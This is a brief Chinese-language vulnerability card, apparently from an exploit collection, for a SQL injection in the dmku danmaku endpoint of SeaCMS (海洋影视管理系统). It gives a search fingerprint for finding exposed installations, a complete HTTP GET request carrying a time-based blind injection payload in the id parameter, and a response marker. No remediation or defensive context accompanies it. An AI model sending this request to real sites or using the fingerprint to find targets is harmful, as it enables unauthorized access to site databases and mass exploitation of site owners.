# SeaCMS海洋影视管理系统dmkuSQL注入漏洞

SeaCMS ｜ SQL注入 ｜ —
- **指纹**：`app="海洋CMS"`
- **请求**：`GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(5)))v)&type=list HTTP/1.1`
- **响应特征**：999